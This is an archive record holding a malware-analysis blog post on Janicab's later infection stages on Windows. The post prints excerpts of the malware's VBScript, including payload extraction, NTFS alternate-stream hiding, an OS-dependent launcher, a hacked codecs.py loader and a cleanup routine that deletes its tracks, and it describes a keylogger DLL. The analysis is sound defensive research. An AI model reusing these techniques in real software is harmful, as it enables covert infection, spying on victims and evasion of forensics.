{
    "id": "0ea2aa9c-d31c-436b-a800-b63659d09bed",
    "created_at": "2023-01-12T15:06:28.80751Z",
    "updated_at": "2025-03-27T02:09:29.303532Z",
    "deleted_at": null,
    "sha1_hash": "4ef94f258428bd0dd56c0165e49c9d269683a637",
    "title": "2022-05-26 - Janicab Series- Further Steps in the Infection Chain",
    "authors": "",
    "file_creation_date": "2022-06-01T12:23:36Z",
    "file_modification_date": "2022-06-01T12:23:36Z",
    "file_size": 207893,
    "plain_text": "# Janicab Series: Further Steps in the Infection Chain\n\n**[malwarology.com/2022/05/janicab-series-further-steps-in-the-infection-chain/](https://www.malwarology.com/2022/05/janicab-series-further-steps-in-the-infection-chain/)**\n\nMay 26, 2022\n\n2022-05-26\n\n[Malware Analysis,](https://www.malwarology.com/categories/malware-analysis) [Janicab](https://www.malwarology.com/categories/janicab)\nIn late April 2022, I was requested to analyze a software artifact. It was an instance of\nJanicab, a software with infostealing and spying capabilities known since 2013. Differently to\nother analyses I do as part of my job, in this particular case I can disclose parts of it with you\nreaders. I’m addressing those parts in a post series. Here, I’ll discuss further stages of a\n[Janicab infection on Microsoft Windows targets, based on this specific sample. If you want to](https://www.virustotal.com/gui/file/20026af8c1bd95d4a39c2d1d1c2909ed133a5d2efac2d6c6b87cbc4d2782fef0)\n[know more about the first infection stages, I recommend you reading this post.](https://www.malwarology.com/2022/05/janicab-series-first-steps-in-the-infection-chain/)\n\n## 2.vbe\n\n[As for .vbe, analyzed here, 2.vbe is a VBScript encoded with the Windows Script Encoder.](https://www.malwarology.com/2022/05/janicab-series-first-steps-in-the-infection-chain/)\nHowever, the script is too long for being fully disclosed as I did for .vbe. Therefore, in this\nsection I’m going to focus on its relevant parts.\n\nInitially, 2.vbe makes a copy of SMTP-error.txt.lnk and names that copy as SMTP[error.txt.lnk.tmp. As SMTP-error.txt.lnk, analysed here, the artifact is placed into the](https://www.malwarology.com/2022/05/janicab-series-first-steps-in-the-infection-chain/)\ntemporary files directory (%TMP%). The intention of the developer is likely to blend SMTPerror.txt.lnk in the content of %TMP%.\n```\nFunction ExtractEmbeddedFile(SourceFile, DestFile, StartPos, EmbbededFileSize,\nprepend, reverse)\n     'On Error Resume Next\n     Set oInputFile = objFSO.GetFile(SourceFile)\n     Set oData = oInputFile.OpenAsTextStream\n     Data = oData.Read(oInputFile.Size)\n     oData.Close\n     StartFrom = StartPos\n     Script = Mid(Data, StartFrom+1, EmbbededFileSize)\n     Set MyFile = objFSO.OpenTextFile(DestFile, 2, True)\n     MyFile.Write prepend\n     If reverse = \"1\" Then\n          MyFile.Write rev(Script)\n     Else\n          MyFile.Write Script\n     End If\n     MyFile.Close\nEnd Function\n\n```\n\n-----\n\n**Listing 1**\n\n2.vbe extracts further artifacts from SMTP-error.txt.lnk.tmp by calling the same function\n\n2.vbe drops several files on disk by extracting them from SMTP-error.txt.lnk.tmp. The\nextraction function is always the same across the various drops and it is similar to that one\nused by .vbe with a couple of enhancements. A first enhancement consists in the possibility\nof prepending the extracted content with a prefix provided as an argument. A second\nenhancement consists in the capability of reversing the order of the characters extracted\nfrom SMTP-error.txt.lnk.tmp. The reverse extraction feature is controlled by a dedicated\nargument. Listing 1 shows the extraction function.\n\n**Figure 1**\n\nSMTP-error.txt decoy file dropped by 2.vbe\n\nThe first file dropped by 2.vbe is named SMTP-error.txt and it is placed in %TMP%. It is\noriginally embedded at the char offset 8685 of SMTP-error.txt.lnk.tmp in reverse order and it\nis 1048 characters long. As you may notice from Figure 1, this artifact is a text file containing\nSMTP error messages. Most likely, this is a decoy file aimed at letting the victim think that the\njust downloaded file was indeed an harmless text containing some SMTP error messages.\nNotice the filename recalling the initial artifact of the infection chain (with the exclusion of the\n.lnk suffix). Curious fact: after having dropped the text file, 2.vbe tries to execute it either via\npowershell.exe or cmd.exe. I’m not going to speculate on the possible explanations for such\na behavior.\n\n\n-----\n\n```\nzipExe expand.exe \nzipFilename = \"cab.cab\"\nzipOffset = 0000000009733\nzipSize = 00002787324\ncall ExtractEmbeddedFile(lnkFilename, zipFilename, zipOffset, zipSize, \"MSCF\",\"\")\nunzipAllCmd = zipExe & \" \" & zipFilename & \" . -F:*\"\nobjShell.Run unzipAllCmd, 0, 1\n\n```\n**Listing 2**\n\n2.vbe extracts a cabinet file cab.cab and extracts its content by leveraging expand.exe utility\n\nA second file dropped by 2.vbe is named cab.cab and it is also placed in %TMP%. It is\noriginally embedded at the char offset 9733 of SMTP-error.txt.lnk.tmp and it is 2787324\ncharacters long. This artifact is a cabinet file. The extraction function is invoked with a prefix\nargument consisting of the cabinet files signature (MSCF). After having dropped cab.cab,\n2.vbe decompresses it by leveraging the expand.exe utility. Listing 2 shows that part of\n2.vbe responsible for extracting, dropping, and decompressing cab.cab file. The cabinet\narchive contains many artifacts and I’m going to discuss them in a dedicated section.\n```\nvbeFilename = objShell.ExpandEnvironmentStrings(\"%UserProfile%\") & \":.vbe\"\nvbeOffset = 0000002797057\nvbeSize = 00000615149\ncall ExtractEmbeddedFile(lnkFilename, vbeFilename, vbeOffset, vbeSize, \"#@~^\",\"\")\n\n```\n**Listing 3**\n\n2.vbe extracts a Windows Script Encoded payload and stores it as an NTFS alternate data\nstream\n\n**Figure 2**\n\n.vbe alternate stream stored at the %USERPROFILE% directory\n\n2.vbe stores a payload as an NTFS alternate data stream of the directory pointed by the\n%USERPROFILE% environment variable. The name of such a stream is .vbe. As you can\nsee from Listing 3, the extraction function is called again with the Windows Script Encoder\n\n\n-----\n\ntag as the prefix argument. Indeed, once stored, the stream starts just with that prefix\n(Figure 2). The payload is located at the char offset 2797057 of SMTP-error.txt.lnk.tmp and it\nis 615149 characters long. I’ll analyze it in a dedicated post.\n```\nFunction isXP()\n     xp = 0\n     Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")\n     Set colOperatingSystems = objWMIService.ExecQuery(\"Select * from\nWin32_OperatingSystem\")\n     For Each objOperatingSystem in colOperatingSystems\n          msg = objOperatingSystem.Version\n          IF Mid(msg,1,3)=\"5.1\" Then\n              xp = 1\n          END IF\n          Next\n     isXP = xp\nEnd Function\nFunction runOnXP()\n     path = objShell.ExpandEnvironmentStrings(\"%userprofile%\")\n     Set objFolder = objFSO.GetFolder(path)\n     path = objFolder.ShortPath\n     Set objFolder = Nothing\n     userProfilePath = split(path, \"\\\")\n     Username = userProfilePath(Ubound(userProfilePath))\n     Set userProfilePath = Nothing\n     objShell.currentdirectory = path & \"\\..\"\n     objShell.Run \"cscript \"\"\" & Username & \"\"\":.vbe\", 0, 0\n     objShell.currentdirectory = path\nEnd Function\n\n```\n**Listing 4**\n\n2.vbe checks if the operating system is Microsoft Windows XP and runs a specific payload if\nthat check tests true\n\nOnce 2.vbe has dropped all files and payloads, it checks for the operating system installed\non the infected machine. If the installed operating system is Microsoft Windows XP, then\n2.vbe executes the just mentioned payload stored as an NTFS alternate data stream. The\noperating system check is implemented by querying the Windows Management\nInstrumentation (WMI) API for VBScript and verifying if the operating system version is 5.1.\n**Listing 4 shows both the operating system check function (isXP) and the launching function**\n(runOnXP).\n\n\n-----\n\n```\nFunction run_dll_or_py(arg1, arg2, arg3)\n     Set tmpObj = CreateObject(\"WScript.Shell\")\n     oldCurrDir = tmpObj.CurrentDirectory\n     tmpObj.CurrentDirectory = tmpPath & \"\\zipContent\\Python\"\n     dllPath = arg1\n     dllFuncName = arg2\n     keepOpen = arg3\n     outFile = tmpPath & \"\\pargs.txt\"\n     Set objFile = objFSO.CreateTextFile(outFile,True)\n     objFile.Write dllPath & vbCrLf & dllFuncName\n     objFile.Close\n     tmpObj.Exec(\"rundll32.exe python27.dll, Py_Initialize\")\n     tmpObj.CurrentDirectory = oldCurrDir\n     Set tmpObj = Nothing\nEnd Function\n\n```\n**Listing 5**\n\n2.vbe routine responsible for initializing an embedded Python 2.7 environment\n\nIf the victim operating system isn’t Microsoft Windows XP, then 2.vbe moves to the\nzipContent directory. 2.vbe creates the zipContent directory after by expanding the content of\ncab.cab artifact. Later, 2.vbe calls the function run_dll_or_py showed in Listing 5. Although\nrun_dll_or_py expects three arguments, the second takes an empty string and the third isn’t\nused by the function. The only meaningful argument is the first: the path to a Python script\nextracted from cab.cab and named replace.py. Function run_dll_or_py writes the path to\nreplace.py in a file named pargs.txt and stored in %TMP%. Eventually, run_dll_or_py\ninitializes a Python 2.7 environment, embedded in 2.vbe, by calling the Py_Initialize export of\nthe python27.dll library (originally stored in cab.cab).\n\n\n-----\n\n```\nimport ctypes, sys, os, imp\nargsFilePath = os.getenv(\"tmp\") + \"\\\\pargs.txt\"\nif os.path.isfile(argsFilePath):\n     with open(argsFilePath, \"r\") as f:\n          dllPath  = f.readline().replace('\\r', '').replace('\\n','')\n          dllFuncName = f.readline().replace('\\r', '').replace('\\n','')\n     #ctypes.windll.user32.MessageBoxA(0, dllPath + dllFuncName, \"title\",1)\n     os.remove(argsFilePath)\n     if \".py\" in dllPath.lower():\n          imp.load_source(\"a\", dllPath)\n     else:\n          mydll = ctypes.cdll.LoadLibrary(dllPath)\n          getattr(mydll,dllFuncName)()\n\n```\n**Listing 6**\n\nHacked version of codecs.py containing a launcher for DLLs and Python scripts\n\nThe content of pargs.txt is consumed by another file originally compressed in cab.cab:\ncodecs.py. Codecs.py is a hacked copy of a [legitimate Python script originally coded to](https://gist.github.com/myint/2e749532166ff3e85badde7b3776a9fb)\nimplement a registry of encoders and encoding-related helpers. This hacked version includes\nan initial code snippet (Listing 6) aimed at reading the pargs.txt file and executing each\nPython script or DLL pointed by any path written in it. However, codecs.py isn’t triggered and\nwhatever got written into pargs.txt is never executed. It is possible that run_dll_or_py was\noriginally coded to execute DLLs or Python scripts (as from the function name) on Microsoft\noperating systems different from XP by initializing an embedded Python execution\nenvironment, writing the modules to be launched in pargs.txt, and eventually execute them\nby triggering codecs.py. I cannot speculate on whatever lead to the observed inconsistent\nstate.\n```\nFunction deleteLeftOvers()\n     objShell.currentdirectory = tmpPath\n     On Error Resume Next\n     Files = Array(zipFilename, zipExe, OldLnkFilename, lnkFilename, doneFile,\n\"zipContent\", \".vbe\", \"2.vbe\")\n     For Each file in Files\n               If objFSO.FolderExists(file) Then \n                   objFSO.DeleteFolder file, 1\n               End If\n               If objFSO.FileExists(file) Then\n                    objFSO.DeleteFile file, 1\n               End If\n              Next\nEnd Function\n\n```\n\n-----\n\n**Listing 7**\n\n2.vbe tries to cover its tracks by deleting all the files dropped during the infection chain\n\nBy coming back to the 2.vbe artifact, I observe that it ends by entering in a loop checking for\nthe existence of a file named done.txt and located in %TMP%. At each iteration of that loop,\n2.vbe pauses for a second. Once that file has been found, 2.vbe cleans the tracks of the\nentire infection chain by deleting all the files dropped from from SMTP-error.txt.lnk. The only\nartifact left on the infected system is SMTP-error.txt.lnk.tmp. The function responsible for\ncleaning the tracks is called deleteLeftOvers and it is showed in Listing 7.\n```\nd~python~%appdata%\\Python\nf~ftp\\runner.py~%userprofile%:runner.py\nf~ftp\\ftp.py~%userprofile%:ftp.py\nf~ftp\\PythonProxy.py~%userprofile%:PythonProxy.py\nf~ftp\\plink.exe~%userprofile%:plink.exe\nf~ftp\\junction.exe~%userprofile%:junction.exe\nf~k.dll~%userprofile%:k.dll\n\n```\n**Listing 8**\n\nFull content of map.txt\n\nWhat is the component responsible for creating done.txt and therefore controlling when the\ninfection chain intrrupts? It would be replacer.py if that was executed. As already mentioned,\nreplacer.py is a Python script and its behavior may be summarized as follows:\n\n1. It touches a file called kill.txt under %TMP%. It is possible that the presence of such file\n\ncould trigger some application killing. However, I wasn’t able to find the software\ncomponent responsible for executing that task.\n2. It does some file replacement based on a file named map.txt and originally included in\n\ncab.cab. Map.txt contains a mapping between source files or directories and\ndestination files or directories (separated by the symbol ~). Each line in map.txt\nrepresents a different replacement rule. Each line may start with either f~ or d~. In the\nformer case, the source file will override the destination file. In the latter case, the\nassociation is about a directory (therefore, the source directory will override the\ndestination directory). The content of map.txt is showed in Listing 8. As you may\nnotice, all the mapping rules regarding single files are targeting alternate data streams\nof the directory pointed by %USERPROFILE% environment variable.\n3. Removes both kill.txt and map.txt.\n4. It executes janicab malware by issuing cscript.exe (I’m going to analyse it in a\n\ndedicated post).\n5. It touches the done.txt file.\n6. It moves to the parent directory.\n\n\n-----\n\n## cab.cab\n\nCab.cab is one of the artifacts embedded in SMTP-error.txt.lnk. It is a cabinet file containing\nmany files. Cab.cab expands to a directory named zipContent containing what follows:\n\nreplacer.py. It is a Python script responsible for replacing files according to the file\nmapping contained in map.txt. I discussed replaced.py with a greater detail in the\nprevious section.\nmap.txt. It is a text file containing the replacement rules enforced by replacer.py. Each\nline in map.txt represents a file or directory replacement. I discussed map.txt with a\ngreater detail in the previous section.\n\n**Figure 3**\n\nk.dll registers a keyboard hook to collect key strokes\n\n**Figure 4**\n\nk.dll collects the windows headings to contextualize the stolen information\n\n\n-----\n\n**Figure 5**\n\nk.dll may store a log of its runs on the infected system\n\n**Figure 6**\n\nk.dll logs the key strokes in a NTFS alternate data stream of %APPDATA%\n\n\n-----\n\nk.dll. It is a DLL implementing a keylogger and clipboard catcher. K.dll sets a low level\nkeyboard hook via SetWindowsHookExW. Figure 3 shows evidence collected in a\ndebugger where SetWindowsHookExW is called with 0xD passed as the first\nargument, corresponding to the WH_KEYBOARD_LL constant. The hooking function\ninvokes the GetAsyncKeyState and GetKeyState to track the user keystrokes. K.dll\ncaptures windows headings to contextualize the stolen information. Figure 4 shows\nevidence of such a behavior collected after inspecting the API calls traces. The logged\nkeys are stored in a NTFS alternate data stream of %APPDATA% directory with name\nkl (Figure 6). Every time is launched, k.dll checks for the existence of a file named\nkillKL.txt in %TMP%\\ReplacedData. If it finds that file, then k.dll logs the timestamp of\nsuch a check in %APPDATA%\\Roaming\\Stormwind\\Log.log. While the existence of\nkillKL.txt may represent an indication of compromise, Log.log may turn useful for\nforensic purposes as a potential source of timestamps for the attacker’s activities on\nthe infected system. Figure 5 shows the content of Log.log as it appears in a safe\nenvironment after a few runs of k.dll.\nA directory named python. This directory contains all the required files to embed a\nPython 2.7 execution environment on the infected systems, including legitimate\nbinaries, DLLs, and compiled Python modules (.pyc). Among those, here I mention\ncodec.py as an hacked copy of a legitimate module containing encoding utilities. I\ndiscuss about codec.py with a greater detail in the previous section.\nA directory named ftp. This directory contains three applications: a ftp server, a proxy\nserver, and a SSH server. All those applications are mainly coded in Python.\nPythonProxy.py implements an HTTP proxy server. Ftp.py implements a FTP server\nleveraging Junction, a legitimate application belonging to the sysinternals suite, to\nmanage directory aliases. Indeed, ftp directory contains an instance of Junction\n(junction.exe). Ftp directory contains runner.py, a command line tool coded in Python\nacting as an interface for both ftp.py and PythonProxy.py. In addition, runner.py\n[implements a SSH server leveraging plink, a backend utility for PuTTY . Indeed, ftp](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)\ndirectory contains an instance of plink client (plink.exe).\n\nThe next post of this series will push the analysis further along the infection chain, by\ndiscussing the Janicab core artifact. As always, if you want to share comments or feedbacks\n(rigorously in broken Italian or broken English) do not esitate to drop me a message at\n**admin[@]malwarology.com.**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-05-26 - Janicab Series- Further Steps in the Infection Chain.pdf"
    ],
    "report_names": [
        "2022-05-26 - Janicab Series- Further Steps in the Infection Chain.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535988,
    "ts_updated_at": 1743041369,
    "ts_creation_date": 1654086216,
    "ts_modification_date": 1654086216,
    "files": {
        "pdf": "https://archive.orkl.eu/4ef94f258428bd0dd56c0165e49c9d269683a637.pdf",
        "text": "https://archive.orkl.eu/4ef94f258428bd0dd56c0165e49c9d269683a637.txt",
        "img": "https://archive.orkl.eu/4ef94f258428bd0dd56c0165e49c9d269683a637.jpg"
    }
}